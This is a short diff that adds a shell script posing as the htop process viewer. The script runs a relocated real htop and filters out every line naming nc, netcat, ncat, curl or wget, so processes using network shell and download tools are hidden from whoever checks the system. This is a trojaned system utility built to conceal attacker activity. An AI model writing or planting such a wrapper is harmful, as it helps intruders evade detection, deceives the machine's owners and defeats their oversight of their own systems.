@@ -1,0 +1,2 @@
+#!/bin/sh
+(/actual_htop $@) | grep -Ev "(nc|netcat|ncat|curl|wget)"
